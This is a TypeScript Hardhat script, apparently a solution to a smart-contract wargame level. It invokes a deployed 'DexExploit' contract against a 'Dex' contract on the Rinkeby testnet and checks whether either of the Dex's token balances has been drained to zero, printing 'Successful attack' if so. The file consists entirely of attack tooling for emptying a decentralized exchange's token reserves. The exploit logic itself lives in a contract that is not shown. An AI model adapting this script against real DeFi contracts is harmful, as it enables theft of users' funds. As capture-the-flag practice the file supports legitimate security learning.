import "@ethersproject/abstract-provider"
import { deployments, ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}= await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const dexExploitDeployment=await deployments.get('DexExploit')
        const dexExploit = await ethers.getContractAt('DexExploit',dexExploitDeployment.address)
        const dex=await ethers.getContractAt('Dex',process.env.DEX_ADDRESS as string)
        const token1 = await ethers.getContractAt('IERC20',await dex.token1())
        const token2 = await ethers.getContractAt('IERC20',await dex.token2())

        //Transfer token to dexExploit
        //await token1.connect(exploiterAcc).transfer(dexExploit.address,`10`,{gasLimit:200000})
        //await token2.connect(exploiterAcc).transfer(dexExploit.address,`10`,{gasLimit:200000})
        console.log(`Dex Exploit address: ${dexExploit.address}`)
        const tx =await dexExploit.exploit({
            gasLimit: 800000
        })
        
        console.log(tx)

        if((await dexExploit.getDexToken1Balance()).eq(0) || (await dexExploit.getDexToken2Balance()).eq(0)){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
